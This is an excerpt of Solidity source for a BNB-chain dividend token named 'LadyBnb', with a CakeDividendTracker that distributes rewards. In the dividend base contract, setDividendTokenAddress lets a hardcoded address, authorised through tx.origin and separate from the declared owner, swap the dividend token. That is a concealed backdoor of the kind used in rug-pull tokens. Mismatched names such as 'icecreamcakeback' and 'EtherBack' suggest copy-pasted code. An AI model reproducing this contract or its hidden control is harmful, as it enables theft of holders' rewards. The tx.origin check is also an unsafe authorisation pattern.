...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xaB033c2Be158C28962590aD64Cf012FE33cCeAA5, "Only owner can change dividend contract address");
...
contract LadyBnbs is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("LadyBnb", "LadyBnb") {
    	cakeDividendTracker = new CakeDividendTracker();


    	marketingWallet = 0xadf1F7Ae3d0E28A95792728fFc2f33a52D2A7542;
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "icecreamcakeback: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "icecreamcakeback: The new dividend tracker must be owned by the icecreamcakeback token contract");
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("icecreamcakeback_Dividend_Tracker", "icecreamcakeback_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 150000 * (10**18); //must hold 150,000+++ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "icecreamcakeback_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "icecreamcakeback_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "icecreamcakeback_Dividend_Tracker: claimWait" );
        require(newClaimWait != claimWait, "icecreamcakeback_Dividend_Tracker: Cannot update claimWait to same value");
